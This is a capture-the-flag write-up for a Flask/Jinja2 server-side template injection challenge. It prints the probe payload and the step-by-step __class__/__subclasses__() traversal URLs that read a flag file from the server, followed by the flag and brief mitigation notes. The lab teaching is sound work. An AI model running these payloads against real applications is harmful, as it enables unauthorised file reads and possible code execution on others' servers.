SSTI Challenge Write-Up

Challenge Overview
Name: SSTI Challenge
Category: Web Exploitation
Difficulty: Medium
Description: This challenge tests your ability to exploit a Server-Side Template Injection (SSTI) vulnerability in a Flask-based web application. The objective is to retrieve the hidden flag from the server by leveraging Python’s object hierarchy.

Objectives
- Exploit the SSTI vulnerability to retrieve the flag from /var/www/html/flag.txt.

Tools Required
- Web browser
- Basic understanding of Jinja2 and Python object traversal

Solution Steps

Step 1: Explore the Application
- Access the web application through the provided URL:
  http://localhost:8080
- You will see a landing page that displays the message:
  "Hello, send something inside the param 'c'!"

Step 2: Test for Template Injection
- Verify that the application is vulnerable to SSTI by passing a basic payload in the c parameter:
  http://localhost:8080/?c={{7*7}}
- If successful, you will see the result of the arithmetic operation (49) rendered on the page.

Step 3: Investigate Python Object Traversal
- Use Python’s __class__ and __subclasses__() methods to explore the object hierarchy:
  http://localhost:8080/?c={{'abc'.__class__.__base__.__subclasses__()}}
- This will display a list of subclasses of Python’s object class, allowing you to find classes related to file handling.

Step 4: Identify the File Handling Class
- Locate the file handler class (e.g., <class '_io.TextIOWrapper'>) within the object hierarchy. The exact index may vary by environment; for example:
  http://localhost:8080/?c={{'abc'.__class__.__base__.__subclasses__()[92]}}
  
Step 5: Read the Flag File
- Use the file handler class to read the flag file located at /var/www/html/flag.txt:
  http://localhost:8080/?c={{'abc'.__class__.__base__.__subclasses__()[92]('/var/www/html/flag.txt').read()}}
- If successful, the content of the flag file will be displayed.

Flag
flag{SepalAI_SSTI_Challenge_R3m0t3_C0de_3x3c}

Notes
- Challenge Purpose: This challenge demonstrates the risks associated with unsanitized template rendering in Flask applications.
- Mitigation: Use proper input sanitization and restrict access to dangerous methods like __class__ and __subclasses__.

